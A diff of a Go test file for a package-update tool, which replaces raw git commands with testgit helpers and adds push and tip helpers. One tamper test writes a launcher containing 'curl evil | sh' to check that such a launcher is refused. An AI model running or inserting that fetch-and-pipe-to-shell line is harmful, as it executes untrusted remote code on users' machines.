@@ -16,6 +16,7 @@ import (
 	"github.com/missingbulb/ClaudiniteEngine/cn/packaging/npmreg"
 	"github.com/missingbulb/ClaudiniteEngine/cn/packaging/settings"
 	"github.com/missingbulb/ClaudiniteEngine/cn/packaging/version"
+	"github.com/missingbulb/ClaudiniteEngine/dev/test/testgit"
 )
 
 const (
@@ -77,29 +78,50 @@ func newWorld(t *testing.T, f settings.Format) *world {
 	w := &world{reg: newRegistry(t), hub: newFake(), out: &bytes.Buffer{}, f: f}
 	root := t.TempDir()
 	w.bare, w.repo = filepath.Join(root, "origin.git"), filepath.Join(root, "member")
-	gitRun(t, root, "init", "-q", "--bare", "-b", "main", w.bare)
-	gitRun(t, root, "init", "-q", "-b", "main", w.repo)
+	testgit.InitBare(t, w.bare, "main")
+	testgit.Init(t, w.repo, "main")
 	_ = os.MkdirAll(filepath.Join(w.repo, ".claudinite"), 0o755)
 	if err := os.WriteFile(filepath.Join(w.repo, settings.RelPath(f)), []byte(settingsFor(f, v1, pin1)), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	gitRun(t, w.repo, "add", "-A")
-	gitRun(t, w.repo, "commit", "-q", "-m", "adopt")
-	gitRun(t, w.repo, "remote", "add", "origin", w.bare)
-	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	testgit.Commit(t, w.repo, "main", "adopt")
+	testgit.Index(t, w.repo)
+	testgit.Origin(t, w.repo, w.bare)
+	w.push(t, "refs/heads/main", "main")
 	w.mainRun(t, "success")
 	w.hub.holdOnOpen = true
 	w.hub.headOf = func(ref string) string {
-		out, err := exec.Command("git", "--git-dir", w.bare, "rev-parse", "--verify", "--quiet", "refs/heads/"+ref).Output()
-		if err != nil {
-			return ""
-		}
-		return strings.TrimSpace(string(out))
+		sha, _ := testgit.Resolve(w.bare, "refs/heads/"+ref)
+		return sha
 	}
 	return w
 }
 
-func (w *world) head(t *testing.T) string { return gitRun(t, w.repo, "rev-parse", "HEAD") }
+// push pushes the member's src (HEAD or refs/...) to branch on origin,
+// forced.
+func (w *world) push(t *testing.T, src, branch string) {
+	t.Helper()
+	testgit.Push(t, w.repo, w.bare, src, branch)
+}
+
+func (w *world) head(t *testing.T) string {
+	t.Helper()
+	sha, err := testgit.Resolve(filepath.Join(w.repo, ".git"), "HEAD")
+	if err != nil {
+		t.Fatal(err)
+	}
+	return sha
+}
+
+// tip is branch's commit on origin.
+func (w *world) tip(t *testing.T, branch string) string {
+	t.Helper()
+	sha, err := testgit.Resolve(w.bare, "refs/heads/"+branch)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return sha
+}
 
 // mainRun sets main's CI: a conclusion, in_progress, or none.
 func (w *world) mainRun(t *testing.T, state string) {
@@ -272,7 +294,7 @@ func TestAReleasesPinProposesTheLatestRelease(t *testing.T) {
 			t.Fatal(err)
 		}
 		gitRun(t, w.repo, "commit", "-q", "-am", "releases")
-		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.push(t, "refs/heads/main", "main")
 		w.mainRun(t, "success")
 		w.publish(t, v2, relOpts{})
 		w.reg.toReleases(t, "acme/acme-distro", pkg, v2)
@@ -314,7 +336,7 @@ func TestAReleasesPinAtTheLatestReleaseIsUpToDate(t *testing.T) {
 		t.Fatal(err)
 	}
 	gitRun(t, w.repo, "commit", "-q", "-am", "releases")
-	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	w.push(t, "refs/heads/main", "main")
 	w.mainRun(t, "success")
 	d := w.deps(t)
 	d.ReleasesHost = w.reg.srv.URL
@@ -427,7 +449,7 @@ func (w *world) openUpdatePR(t *testing.T, n int, ver, ciConclusion string) stri
 	gitRun(t, w.repo, "checkout", "-q", "-b", branch)
 	_ = os.WriteFile(filepath.Join(w.repo, settings.RelPath(w.f)), []byte(settingsFor(w.f, ver, w.pinOf(t, ver))), 0o644)
 	gitRun(t, w.repo, "commit", "-q", "-am", "pin")
-	gitRun(t, w.repo, "push", "-q", "origin", branch)
+	w.push(t, "refs/heads/"+branch, branch)
 	sha := w.head(t)
 	gitRun(t, w.repo, "checkout", "-q", "main")
 	gitRun(t, w.repo, "branch", "-q", "-D", branch)
@@ -630,7 +652,7 @@ func TestLandRefusesWhatIsNotAPinOnlyUpdatePR(t *testing.T) {
 			_ = os.WriteFile(filepath.Join(w.repo, "RULES.md"), []byte("x\n"), 0o644)
 			gitRun(t, w.repo, "add", "RULES.md")
 			gitRun(t, w.repo, "commit", "-q", "-m", "more")
-			gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+w.hub.pulls[0].HeadRef)
+			w.push(t, "HEAD", w.hub.pulls[0].HeadRef)
 			w.hub.pulls[0].HeadSHA = w.head(t)
 			gitRun(t, w.repo, "checkout", "-q", "main")
 		},
@@ -641,7 +663,7 @@ func TestLandRefusesWhatIsNotAPinOnlyUpdatePR(t *testing.T) {
 			b, _ := os.ReadFile(p)
 			_ = os.WriteFile(p, bytes.Replace(b, []byte("# kept"), []byte("# changed"), 1), 0o644)
 			gitRun(t, w.repo, "commit", "-q", "-am", "more")
-			gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+w.hub.pulls[0].HeadRef)
+			w.push(t, "HEAD", w.hub.pulls[0].HeadRef)
 			w.hub.pulls[0].HeadSHA = w.head(t)
 			gitRun(t, w.repo, "checkout", "-q", "main")
 		},
@@ -865,7 +887,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 		if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
 			t.Fatalf("%q %v\n%s", v, err, w.out)
 		}
-		return w, gitRun(t, w.bare, "rev-parse", "claudinite/engine-"+v2)
+		return w, w.tip(t, "claudinite/engine-"+v2)
 	}
 	w, sha := propose(t)
 	w.hub.pulls[0].HeadSHA = sha
@@ -881,7 +903,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 	b, _ := os.ReadFile(p)
 	_ = os.WriteFile(p, bytes.Replace(b, []byte(`"hello": "1.0"`), []byte(`"hello": "9.9"`), 1), 0o644)
 	gitRun(t, w.repo, "commit", "-q", "-am", "tamper")
-	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.push(t, "HEAD", branch)
 	w.hub.pulls[0].HeadSHA = w.head(t)
 	gitRun(t, w.repo, "checkout", "-q", "main")
 	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "member") {
@@ -901,7 +923,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 	_ = os.WriteFile(legacy, []byte("{}\n"), 0o644)
 	gitRun(t, w.repo, "add", "-A")
 	gitRun(t, w.repo, "commit", "-q", "-m", "a member file from before the move")
-	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	w.push(t, "refs/heads/main", "main")
 	w.mainRun(t, "success")
 	w.publish(t, v2, relOpts{})
 	if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
@@ -910,7 +932,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != flatdecl.LegacyPath(flatdecl.MemberFile)+"\n"+settings.RelPath(settings.YAML) {
 		t.Errorf("a legacy member's engine PR changed %q", got)
 	}
-	sha = gitRun(t, w.bare, "rev-parse", branch)
+	sha = w.tip(t, branch)
 	w.hub.pulls[0].HeadSHA = sha
 	if v, err := Land(landJob(w.hub, w.deps(t), sha), 1, sha); err != nil || v != "landed "+v2 {
 		t.Errorf("a legacy member's engine PR: %q %v\n%s", v, err, w.out)
@@ -925,7 +947,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 	b, _ = os.ReadFile(p)
 	_ = os.WriteFile(p, bytes.Replace(b, []byte(settingsFor(w.f, v1, pin1)), []byte(settingsFor(w.f, v3, w.pinOf(t, v3))), 1), 0o644)
 	gitRun(t, w.repo, "commit", "-q", "-am", "main moves on")
-	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	w.push(t, "refs/heads/main", "main")
 	if _, err := Land(w.deps(t), 1, sha); err == nil || !strings.Contains(err.Error(), "not newer") {
 		t.Errorf("a pin older than main's landed: %v", err)
 	}
@@ -946,7 +968,7 @@ func declareHello(t *testing.T, w *world) {
 	}
 	gitRun(t, w.repo, "add", "-A")
 	gitRun(t, w.repo, "commit", "-q", "-m", "declare hello")
-	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	w.push(t, "refs/heads/main", "main")
 	w.mainRun(t, "success")
 }
 
@@ -960,7 +982,7 @@ func TestTheUpdatePRMovesALegacyPinToTheCanaryChannel(t *testing.T) {
 			t.Fatal(err)
 		}
 		gitRun(t, w.repo, "commit", "-q", "-am", "on cli-rc")
-		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.push(t, "refs/heads/main", "main")
 		w.mainRun(t, "success")
 		w.publish(t, v2, relOpts{tag: "rc"})
 		v, err := Engine(w.deps(t), Options{})
@@ -1041,13 +1063,13 @@ func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
 		_ = os.WriteFile(p, []byte("#!/bin/sh\n# launcher of "+v1+"\n"), 0o755)
 		gitRun(t, w.repo, "add", "-A")
 		gitRun(t, w.repo, "commit", "-q", "-m", "the launcher "+v1+" shipped")
-		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.push(t, "refs/heads/main", "main")
 		w.mainRun(t, "success")
 		w.publish(t, v2, o)
 		if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
 			t.Fatalf("%q %v\n%s", v, err, w.out)
 		}
-		return w, gitRun(t, w.bare, "rev-parse", branch)
+		return w, w.tip(t, branch)
 	}
 
 	w, sha := propose(t, relOpts{})
@@ -1080,7 +1102,7 @@ func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
 	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\n# launcher of "+v2+"\n"), 0o755)
 	gitRun(t, w.repo, "add", "-A")
 	gitRun(t, w.repo, "commit", "-q", "-m", "add the launcher")
-	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.push(t, "HEAD", branch)
 	w.hub.pulls[0].HeadSHA = w.head(t)
 	gitRun(t, w.repo, "checkout", "-q", "main")
 	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "only cn adopt writes") {
@@ -1099,7 +1121,7 @@ func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
 	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
 	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
 	gitRun(t, w.repo, "commit", "-q", "-am", "tamper")
-	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.push(t, "HEAD", branch)
 	w.hub.pulls[0].HeadSHA = w.head(t)
 	gitRun(t, w.repo, "checkout", "-q", "main")
 	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "not the launcher") {
